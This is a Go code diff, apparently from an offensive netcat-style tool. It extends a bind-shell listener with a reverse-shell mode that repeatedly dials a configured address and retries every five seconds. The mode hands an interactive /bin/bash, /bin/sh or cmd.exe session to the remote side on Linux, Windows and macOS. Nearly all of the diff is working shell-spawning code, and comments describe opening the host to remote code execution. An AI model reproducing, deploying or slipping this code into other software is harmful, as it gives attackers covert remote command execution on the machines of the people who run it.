@@ -9,6 +9,7 @@ import (
 	"net"
 	"os/exec"
 	"runtime"
+	"time"
 )
 
 func OperatingSystemDetect() *string {
@@ -23,55 +24,64 @@ type ServerBindUserInputNetcat struct {
 
 func (uin *ServerBindUserInputNetcat) NcBindTwo() {
 	var (
-		port      int    = uin.Port
-		address   string = fmt.Sprintf(":%d", port)
-		osRuntime string = runtime.GOOS
+		bind        bool   = uin.Bind
+		reverse     bool   = uin.Reverse
+		port        int    = uin.Port
+		address     string = uin.Address
+		bindAddress string = fmt.Sprintf(":%d", port)
+		osRuntime   string = runtime.GOOS
+		callAddress string = fmt.Sprintf("%s:%d", address, port)
 	)
 
-	listener, err := net.Listen("tcp", address)
-	if err != nil {
-		log.Fatalf("Unable to bind to port %s", address)
+	if bind && reverse {
+		log.Fatalln("Cannot bind and reverse at the same time.")
 	}
-	for {
-		conn, err := listener.Accept()
-		log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
+
+	if bind {
+		listener, err := net.Listen("tcp", bindAddress)
 		if err != nil {
-			log.Fatalln("Unable to accept connection.")
+			log.Fatalf("Unable to bind to port %s", bindAddress)
 		}
-		switch osRuntime {
-		case "linux":
-			go SimpleHandleLinux(conn)
-		case "windows":
-			go SimpleHandleWindows(conn)
-		default:
-			log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
-			// fmt.Printf("Unsupported OS, report bug for %s\n", osRuntime)
-			// os.Exit(1)
+		log.Println("[*] Binding shell spawning for remote code execution")
+		for {
+			conn, err := listener.Accept()
+			log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
+			if err != nil {
+				log.Fatalln("Unable to accept connection.")
+			}
+			switch osRuntime {
+			case "linux":
+				go SimpleHandleLinux(conn)
+			case "windows":
+				go SimpleHandleWindows(conn)
+			case "darwin":
+				go SimpleHandleDarwin(conn)
+			default:
+				log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
+			}
 		}
 	}
-	// switch osRuntime {
-	// case "linux":
-	// 	for {
-	// 		conn, err := listener.Accept()
-	// 		log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
-	// 		if err != nil {
-	// 			log.Fatalln("Unable to accept connection.")
-	// 		}
-	// 		go SimpleHandleLinux(conn)
-	// 	}
-	// case "windows":
-	// 	for {
-	// 		conn, err := listener.Accept()
-	// 		log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
-	// 		if err != nil {
-	// 			log.Fatalln("Unable to accept connection.")
-	// 		}
-	// 		go SimpleHandleWindows(conn)
-	// 	}
-	// default:
-	// 	fmt.Printf("Unsupported OS, report bug for %s\n", osRuntime)
-	// 	os.Exit(1)
-	// }
+	if reverse {
+		for {
+			caller, err := net.Dial("tcp", callAddress)
+			if err != nil {
+				log.Println(err)
+				log.Println("[*] Retrying in 5 seconds")
+				time.Sleep(5 * time.Second)
+			}
+			log.Printf("[*] Rev shell spawning, connecting to %s", callAddress)
+			switch osRuntime {
+			case "linux":
+				RevHandleLinux(caller)
+			case "windows":
+				RevHandleWindows(caller)
+			case "darwin":
+				RevHandleDarwin(caller)
+			default:
+				log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
+			}
+		}
+	}
 }
 
 // Bind to local port, open up host to remote code execution
@@ -103,29 +113,6 @@ func NcBind(mappedUserInput map[string]string) {
 			// os.Exit(1)
 		}
 	}
-	// switch osRuntime {
-	// case "linux":
-	// 	for {
-	// 		conn, err := listener.Accept()
-	// 		log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
-	// 		if err != nil {
-	// 			log.Fatalln("Unable to accept connection.")
-	// 		}
-	// 		go SimpleHandleLinux(conn)
-	// 	}
-	// case "windows":
-	// 	for {
-	// 		conn, err := listener.Accept()
-	// 		log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
-	// 		if err != nil {
-	// 			log.Fatalln("Unable to accept connection.")
-	// 		}
-	// 		go SimpleHandleWindows(conn)
-	// 	}
-	// default:
-	// 	fmt.Printf("Unsupported OS, report bug for %s\n", osRuntime)
-	// 	os.Exit(1)
-	// }
 }
 
 // Flusher wraps bufio.Writer, explicitly flushing on all writes
@@ -133,7 +120,7 @@ type Flusher struct {
 	w *bufio.Writer
 }
 
-// NewFlusher creates a new Flusher from an io.Writer
+// Constructor NewFlusher creates a new Flusher from an io.Writer
 func NewFlusher(w io.Writer) *Flusher {
 	return &Flusher{
 		w: bufio.NewWriter(w),
@@ -171,6 +158,7 @@ func DifficultHandle(conn net.Conn) {
 }
 
 func SimpleHandleLinux(conn net.Conn) {
+	// Bind Shell
 	// Explicitly calling /bin/sh and using -i for interactive mode
 	// so that we can use it for stdin and stdout
 	cmd := exec.Command("/bin/bash", "-i")
@@ -184,6 +172,7 @@ func SimpleHandleLinux(conn net.Conn) {
 }
 
 func SimpleHandleWindows(conn net.Conn) {
+	// Bind Shell
 	// Explicitly calling cmd.exe for cmd execution
 	// so that we can use it for stdin and stdout
 	cmd := exec.Command("cmd.exe")
@@ -194,4 +183,45 @@ func SimpleHandleWindows(conn net.Conn) {
 	go io.Copy(conn, rp)
 	cmd.Run()
 	conn.Close()
+}
+
+func SimpleHandleDarwin(conn net.Conn) {
+	// Bind Shell
+	cmd := exec.Command("/bin/sh", "-i")
+	rp, wp := io.Pipe()
+	cmd.Stdin = conn
+	cmd.Stdout = wp
+	go io.Copy(conn, rp)
+	cmd.Run()
+	conn.Close()
+}
+
+func RevHandleLinux(caller net.Conn) {
+	log.Println("Linux")
+	cmd := exec.Command("/bin/bash")
+	cmd.Stdin = caller
+	cmd.Stdout = caller
+	cmd.Stderr = caller
+	cmd.Run()
+	// caller.Close()
+}
+
+func RevHandleWindows(caller net.Conn) {
+	log.Println("Windows")
+	cmd := exec.Command("cmd.exe")
+	cmd.Stdin = caller
+	cmd.Stdout = caller
+	cmd.Stderr = caller
+	cmd.Run()
+	// caller.Close()
+}
+
+func RevHandleDarwin(caller net.Conn) {
+	log.Println("Darwin")
+	cmd := exec.Command("/bin/bash")
+	cmd.Stdin = caller
+	cmd.Stdout = caller
+	cmd.Stderr = caller
+	cmd.Run()
+	// caller.Close()
 }
